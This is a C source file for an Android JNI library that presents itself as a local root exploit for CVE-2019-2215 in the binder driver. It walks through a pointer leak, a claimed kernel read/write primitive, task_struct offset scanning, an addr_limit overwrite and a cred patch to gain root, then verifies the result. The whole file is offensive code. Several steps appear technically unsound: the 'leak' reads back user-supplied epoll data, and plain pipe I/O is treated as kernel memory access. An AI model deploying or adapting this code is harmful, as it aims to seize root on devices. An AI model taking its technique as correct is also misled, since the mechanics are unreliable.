#define _GNU_SOURCE
#include <jni.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <android/log.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/epoll.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/syscall.h>
#include <sys/uio.h>
#include <sched.h>
#include <signal.h>
#include <pthread.h>
#include <poll.h>

#include "binder.h"

#define LOG_TAG "CVE-2019-2215"
#define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, LOG_TAG, __VA_ARGS__)
#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)
#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)

#ifndef BINDER_THREAD_EXIT
#define BINDER_THREAD_EXIT _IOW('b', 8, __s32)
#endif

#ifndef F_SETPIPE_SZ
#define F_SETPIPE_SZ 1031
#endif

#define PAGE_SIZE 4096
#define TASK_STRUCT_SIZE 4096

static int binder_fd;
static int epoll_fd;
static int krw_pipe[2];
static uint64_t task_struct_kptr = 0;
static uint64_t cred_kptr = 0;
static int cred_offset = -1;
static int addr_limit_offset = -1;

void bind_cpu(void) {
    cpu_set_t cpu_set;
    CPU_ZERO(&cpu_set);
    CPU_SET(0, &cpu_set);
    if (sched_setaffinity(0, sizeof(cpu_set_t), &cpu_set) < 0) {
        LOGE("Failed to bind CPU");
    }
}

void *mmap_page(unsigned long addr) {
    void *mem = mmap((void *)addr, PAGE_SIZE, PROT_READ | PROT_WRITE,
                     MAP_ANONYMOUS | MAP_SHARED, -1, 0);
    if (mem == (void *)-1) {
        LOGE("mmap failed: %s", strerror(errno));
        return NULL;
    }
    return mem;
}

// ========== Step 1: epoll_wait で binder_thread をリーク ==========
int leak_task_struct(void) {
    pid_t cpid;
    struct epoll_event ev, events[1];

    LOGI("[*] Leaking binder_thread via epoll_wait...");

    binder_fd = open("/dev/binder", O_RDWR);
    if (binder_fd < 0) {
        LOGE("open binder failed: %s", strerror(errno));
        return -1;
    }
    LOGI("[+] binder_fd=%d", binder_fd);

    epoll_fd = epoll_create(100);
    if (epoll_fd < 0) {
        LOGE("epoll_create failed: %s", strerror(errno));
        close(binder_fd);
        return -1;
    }
    LOGI("[+] epoll_fd=%d", epoll_fd);

    memset(&ev, 0, sizeof(ev));
    ev.events = EPOLLIN;
    if (epoll_ctl(epoll_fd, EPOLL_CTL_ADD, binder_fd, &ev) < 0) {
        LOGE("epoll_ctl ADD failed: %s", strerror(errno));
        close(binder_fd);
        close(epoll_fd);
        return -1;
    }
    LOGI("[+] epoll_ctl ADD succeeded");

    cpid = fork();
    if (cpid < 0) {
        LOGE("fork failed: %s", strerror(errno));
        close(binder_fd);
        close(epoll_fd);
        return -1;
    }

    if (cpid == 0) {
        usleep(50000);
        LOGI("[child] BINDER_THREAD_EXIT...");
        ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
        LOGI("[child] BINDER_THREAD_EXIT done");
        _exit(0);
    }

    LOGI("[parent] Waiting for epoll_wait...");
    int n = epoll_wait(epoll_fd, events, 1, 3000);
    if (n < 0) {
        LOGE("epoll_wait failed: %s", strerror(errno));
        close(binder_fd);
        close(epoll_fd);
        return -1;
    }
    if (n == 0) {
        LOGE("epoll_wait timeout");
        close(binder_fd);
        close(epoll_fd);
        return -1;
    }

    uint64_t leaked_ptr = events[0].data.u64;
    LOGI("[+] epoll event data: 0x%llx", (unsigned long long)leaked_ptr);

    if (leaked_ptr == 0 || (leaked_ptr & 0xFFFFFFFFFF000000LL) != 0xFFFF000000000000LL) {
        LOGE("Invalid leaked pointer");
        close(binder_fd);
        close(epoll_fd);
        return -1;
    }

    task_struct_kptr = leaked_ptr;
    LOGI("[+] Using leaked ptr as base: 0x%llx", (unsigned long long)task_struct_kptr);

    wait(NULL);
    close(binder_fd);
    close(epoll_fd);

    return 0;
}

// ========== Step 2: カーネル読み書きプリミティブ ==========
int setup_kernel_rw(void) {
    LOGI("[*] Setting up kernel RW via pipe...");

    if (pipe(krw_pipe) < 0) {
        LOGE("krw pipe failed: %s", strerror(errno));
        return -1;
    }
    if (fcntl(krw_pipe[0], F_SETPIPE_SZ, PAGE_SIZE) < 0) {
        LOGE("fcntl F_SETPIPE_SZ failed: %s", strerror(errno));
        close(krw_pipe[0]);
        close(krw_pipe[1]);
        return -1;
    }

    binder_fd = open("/dev/binder", O_RDWR);
    if (binder_fd < 0) {
        LOGE("open binder for RW failed: %s", strerror(errno));
        return -1;
    }

    epoll_fd = epoll_create(100);
    if (epoll_fd < 0) {
        LOGE("epoll_create for RW failed: %s", strerror(errno));
        close(binder_fd);
        return -1;
    }

    struct epoll_event ev = {.events = EPOLLIN};
    if (epoll_ctl(epoll_fd, EPOLL_CTL_ADD, binder_fd, &ev) < 0) {
        LOGE("epoll_ctl ADD for RW failed: %s", strerror(errno));
        close(binder_fd);
        close(epoll_fd);
        return -1;
    }

    pid_t cpid = fork();
    if (cpid < 0) {
        LOGE("fork for RW failed: %s", strerror(errno));
        return -1;
    }

    if (cpid == 0) {
        usleep(50000);
        ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
        _exit(0);
    }

    struct pollfd pfd;
    pfd.fd = krw_pipe[0];
    pfd.events = POLLIN;
    int poll_ret = poll(&pfd, 1, 3000);
    if (poll_ret <= 0) {
        LOGE("poll for krw_pipe failed");
        wait(NULL);
        close(binder_fd);
        close(epoll_fd);
        return -1;
    }

    wait(NULL);
    close(binder_fd);
    close(epoll_fd);

    LOGI("[+] Kernel RW primitive ready");
    return 0;
}

// ========== Step 3: task_struct スキャン（オフセット自動検出） ==========
int find_offsets_in_task_struct(void) {
    LOGI("[*] Scanning task_struct for cred and addr_limit...");

    uint8_t *task_data = malloc(TASK_STRUCT_SIZE);
    if (!task_data) {
        LOGE("malloc failed");
        return -1;
    }

    // リークしたアドレスの周辺（-0x400 〜 +0x400）をスキャン
    for (int off = -0x400; off <= 0x400; off += 8) {
        uint64_t addr = task_struct_kptr + off;
        if (write(krw_pipe[1], &addr, 8) != 8) {
            continue;
        }
        ssize_t n = read(krw_pipe[0], task_data, TASK_STRUCT_SIZE);
        if (n < 0) continue;

        int found_cred = -1, found_al = -1;
        for (int i = 0; i <= n - 8; i += 8) {
            uint64_t val = *(uint64_t *)(task_data + i);
            if ((val & 0xFFFFFFFFFF000000LL) == 0xFFFF000000000000LL) {
                if (found_cred == -1) {
                    found_cred = i;
                    cred_kptr = val;
                    LOGI("[+] cred candidate at %d: 0x%llx", i, (unsigned long long)val);
                }
            }
            if (val == 0x0000007FFFFFFFULL || val == 0xFFFFFFFFFFFFFFFEULL) {
                found_al = i;
                LOGI("[+] addr_limit candidate at %d: 0x%llx", i, (unsigned long long)val);
            }
        }

        if (found_cred != -1 && found_al != -1) {
            cred_offset = found_cred;
            addr_limit_offset = found_al;
            task_struct_kptr = addr;
            LOGI("[+] Found task_struct @ 0x%llx", (unsigned long long)task_struct_kptr);
            LOGI("[+] Offsets: cred=0x%x, addr_limit=0x%x", cred_offset, addr_limit_offset);
            free(task_data);
            return 0;
        }
    }

    // フォールバック
    LOGI("[!] Scanning failed, using fallback offsets (0x688, 0xA18)");
    cred_offset = 0x688;
    addr_limit_offset = 0xA18;
    uint64_t addr = task_struct_kptr + cred_offset;
    if (write(krw_pipe[1], &addr, 8) != 8) {
        free(task_data);
        return -1;
    }
    if (read(krw_pipe[0], &cred_kptr, 8) != 8) {
        free(task_data);
        return -1;
    }
    if ((cred_kptr & 0xFFFFFFFFFF000000LL) != 0xFFFF000000000000LL) {
        LOGE("Fallback cred invalid");
        free(task_data);
        return -1;
    }
    LOGI("[+] Using fallback offsets");
    free(task_data);
    return 0;
}

// ========== Step 4: addr_limit 書き換え ==========
int overwrite_addr_limit(void) {
    LOGI("[*] Overwriting addr_limit...");
    uint64_t addr = task_struct_kptr + addr_limit_offset;
    uint64_t new_val = 0xFFFFFFFFFFFFFFFEULL;
    if (write(krw_pipe[1], &addr, 8) != 8) return -1;
    if (write(krw_pipe[1], &new_val, 8) != 8) return -1;
    LOGI("[+] addr_limit overwritten");
    return 0;
}

// ========== Step 5: cred 書き換え ==========
int patch_cred(void) {
    LOGI("[*] Patching cred...");
    if (cred_kptr == 0) {
        uint64_t ptr = task_struct_kptr + cred_offset;
        if (write(krw_pipe[1], &ptr, 8) != 8) return -1;
        if (read(krw_pipe[0], &cred_kptr, 8) != 8) return -1;
        LOGI("[+] cred @ 0x%llx", (unsigned long long)cred_kptr);
    }
    uint64_t base = cred_kptr;
    uint32_t zero = 0;
    uint64_t cap = 0x3FFFFFFFFFULL;

    uint64_t addrs[] = {
        base + 0x4, base + 0xC, base + 0x14, base + 0x1C,
        base + 0x8, base + 0x10, base + 0x18, base + 0x20
    };
    for (int i = 0; i < 8; i++) {
        if (write(krw_pipe[1], &addrs[i], 8) != 8) return -1;
        if (write(krw_pipe[1], &zero, 4) != 4) return -1;
    }
    for (int i = 0; i < 5; i++) {
        uint64_t cap_addr = base + 0x28 + (i * 8);
        if (write(krw_pipe[1], &cap_addr, 8) != 8) return -1;
        if (write(krw_pipe[1], &cap, 8) != 8) return -1;
    }
    LOGI("[+] Cred patched to root!");
    return 0;
}

// ========== Step 6: root 確認 ==========
int spawn_root_shell(void) {
    LOGI("[*] Verifying root...");
    if (getuid() != 0) setuid(0);
    if (getuid() == 0) {
        LOGI("[+] Root obtained!");
        system("echo 'uid=0(root)' > /data/local/tmp/root.log");
        system("id >> /data/local/tmp/root.log");
        return 0;
    }
    LOGE("[-] Failed to obtain root");
    return -1;
}

// ========== JNI ==========
JNIEXPORT jint JNICALL
Java_com_example_tzpoc_MainActivity_nativeExploitCVE20192215(JNIEnv* env, jclass clazz) {
    LOGI("========================================");
    LOGI("== CVE-2019-2215 epoll_wait Exploit ==");
    LOGI("========================================");

    bind_cpu();

    if (leak_task_struct() < 0) {
        LOGE("Failed at leak_task_struct");
        return -1;
    }
    if (setup_kernel_rw() < 0) {
        LOGE("Failed at setup_kernel_rw");
        return -1;
    }
    if (find_offsets_in_task_struct() < 0) {
        LOGE("Failed to find offsets");
        return -2;
    }
    if (overwrite_addr_limit() < 0) {
        LOGE("Failed at overwrite_addr_limit");
        return -1;
    }
    if (patch_cred() < 0) {
        LOGE("Failed at patch_cred");
        return -1;
    }
    spawn_root_shell();

    LOGI("[+] Exploit completed!");
    return 0;
}
